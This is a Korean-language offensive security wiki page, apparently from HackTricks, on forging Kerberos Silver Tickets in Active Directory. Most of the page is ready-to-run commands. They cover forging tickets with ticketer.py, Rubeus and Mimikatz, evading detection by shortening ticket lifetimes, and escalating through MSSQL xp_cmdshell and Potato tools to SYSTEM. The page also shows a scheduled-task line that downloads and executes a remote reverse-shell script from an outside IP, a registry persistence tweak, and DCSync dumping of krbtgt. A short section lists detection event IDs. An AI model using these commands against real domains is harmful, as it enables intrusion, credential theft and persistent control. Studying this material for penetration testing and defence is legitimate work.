# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** 공격은 Active Directory(AD) 환경에서 service ticket을 악용하는 공격입니다. 이 방법은 컴퓨터 계정과 같은 service account의 **NTLM hash를 획득**해 Ticket Granting Service(TGS) ticket을 위조하는 방식입니다. 위조한 ticket으로 네트워크의 특정 service에 접근해 **어떤 사용자로든 가장**할 수 있으며, 일반적으로 관리자 권한을 노립니다. ticket 위조에는 AES key를 사용하는 편이 더 안전하고 탐지하기 어렵습니다.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Ticket은 krbtgt 계정이 아니라 **service account의 hash만** 필요하므로 Golden Ticket보다 탐지하기 어렵습니다. 하지만 대상으로 삼은 특정 service에만 사용할 수 있습니다. 또한, 사용자 비밀번호를 훔치는 것만으로도 가능합니다.
또한, **SPN이 설정된 계정의 비밀번호를 탈취하면** 해당 비밀번호로 Silver Ticket을 생성해 그 service에서 어떤 사용자로든 가장할 수 있습니다.

### 최신 Kerberos 변경 사항 (AES 전용 도메인)

- **2022년 11월 8일(KB5021131)**부터 제공된 Windows 업데이트는 가능한 경우 service ticket에 **AES session key**를 기본적으로 사용하며, RC4는 단계적으로 폐지하고 있습니다. DC는 2026년 중반까지 RC4가 **기본적으로 비활성화된 상태**로 제공될 예정이므로, silver ticket에 NTLM/RC4 hash를 사용하면 `KRB_AP_ERR_MODIFIED` 오류가 발생하는 경우가 늘어납니다. 대상 service account의 **AES key**(`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`)를 항상 추출하세요.<sup>[[5]](#references)</sup>
- service account의 `msDS-SupportedEncryptionTypes`가 AES로 제한되어 있으면 `/aes256` 또는 `-aesKey`를 사용해 위조해야 합니다. NTLM hash를 보유하고 있어도 RC4(`/rc4` 또는 `-nthash`)는 작동하지 않습니다.<sup>[[6]](#references)</sup>
- gMSA/컴퓨터 계정은 30일마다 비밀번호가 변경됩니다. 위조하기 전에 LSASS, Secretsdump/NTDS 또는 DCsync에서 **현재 AES key**를 덤프하세요.
- OPSEC: 도구의 기본 ticket 수명이 **10년**인 경우가 많습니다. 비정상적인 수명으로 탐지되지 않도록 현실적인 기간(예: `-duration 600`분)을 설정하세요.<sup>[[6]](#references)</sup>

ticket 생성에는 운영 체제에 따라 여러 도구를 사용합니다.

### Linux 환경에서

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Windows에서

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

CIFS 서비스는 피해자의 파일 시스템에 접근하기 위한 일반적인 대상으로 주목받지만, HOST 및 RPCSS 같은 다른 서비스도 작업 및 WMI 쿼리에 악용될 수 있습니다.

### 예시: MSSQL 서비스(MSSQLSvc) + Potato로 SYSTEM 권한 획득

계정의 NTLM hash(또는 AES key)가 있고 해당 계정에 **등록된 정확한 SQL 서비스 SPN**이 연결되어 있다면, 위조된 서비스 티켓이 해당 서비스에서 허용될 수 있습니다. 티켓의 서비스 클래스와 호스트 이름은 실제 SPN과 일치해야 합니다. 모든 설치에서 `MSSQLSvc/`를 사용한다고 가정하지 마세요. 또한 주장된 ID는 `xp_cmdshell`을 활성화하고 실행하는 데 필요한 권한을 가진 SQL 로그인에 매핑되어야 합니다. `xp_cmdshell` 명령이 성공하면 SQL 서비스 프로세스 ID로 실행됩니다(sysadmin이 아닌 호출자의 경우 구성된 프록시로 실행될 수 있음). 별도의 Potato 경로를 고려하기 전에 해당 **프로세스 토큰**에서 `SeImpersonatePrivilege`가 활성화되어 있는지 확인하세요. 서비스 구성이나 SPN만으로는 이를 입증할 수 없습니다.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- 결과 컨텍스트에 SeImpersonatePrivilege가 있다면(서비스 계정에서 흔히 해당), Potato 변종을 사용해 SYSTEM을 획득합니다:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

MSSQL 악용 및 xp_cmdshell 활성화에 대한 자세한 내용:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato 기법 개요:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## 사용 가능한 서비스

| 서비스 유형                               | 서비스 Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS에 따라 다음도 해당:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>경우에 따라 다음을 요청할 수도 있습니다: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, psexec 포함            | CIFS                                                                       |
| DCSync를 포함한 LDAP 작업                  | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus**를 사용하면 다음 매개변수로 이러한 티켓을 **모두 요청**할 수 있습니다.

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets 이벤트 ID

- 4624: 계정 로그온
- 4634: 계정 로그오프
- 4672: 관리자 로그온
- **동일한 클라이언트/서비스에 대해 DC에 선행하는 4768/4769가 없는 경우**는 위조된 TGS가 서비스에 직접 제시되었음을 나타내는 흔한 지표입니다.
- 비정상적으로 긴 티켓 수명이나 예상치 못한 암호화 유형(도메인에서 AES를 적용하는데 RC4 사용)도 4769/4624 데이터에서 눈에 띕니다.

## 지속성

컴퓨터가 30일마다 암호를 변경하지 않도록 하려면 `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`로 설정하거나, `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge`를 30일보다 큰 값으로 설정하여 컴퓨터 암호의 변경 주기를 지정할 수 있습니다.<sup>[[3]](#references)</sup>

## 서비스 티켓 악용

다음 예시에서는 관리자 계정을 가장해 티켓을 가져왔다고 가정하겠습니다.

### CIFS

이 티켓을 사용하면 **SMB**를 통해 `C$` 및 `ADMIN$` 폴더에 액세스하고(공유되어 있는 경우) 다음과 같이 원격 파일 시스템의 일부 위치에 파일을 복사할 수 있습니다:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

호스트 내부에서 shell을 얻거나 **psexec**를 사용해 임의의 명령을 실행할 수도 있습니다:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### 호스트

이 권한이 있으면 원격 컴퓨터에 scheduled task를 생성하고 임의의 명령을 실행할 수 있습니다:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

이 티켓으로 **피해자 시스템에서 WMI를 실행할 수 있습니다**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

다음 페이지에서 **wmiexec에 대한 추가 정보**를 확인하세요:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### 호스트 + WSMAN (WINRM)

컴퓨터에 대한 winrm 액세스 권한이 있으면 해당 컴퓨터에 **액세스**하고 PowerShell도 실행할 수 있습니다:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

원격 호스트에 winrm으로 연결하는 **더 많은 방법**은 다음 페이지를 참고하세요:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> 원격 컴퓨터에 액세스하려면 **winrm이 활성화되어 있고 연결 대기 상태여야 합니다**.

### LDAP

이 권한으로 **DCSync**를 사용해 DC 데이터베이스를 덤프할 수 있습니다:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**다음 페이지에서 DCSync에 대해 더 알아보세요:**


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Kerberos를 공격하는 방법? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Machine Account Password Process - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato 경로](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos 강화 및 RC4 지원 중단](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py의 현재 옵션(AES/keytab/기간)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
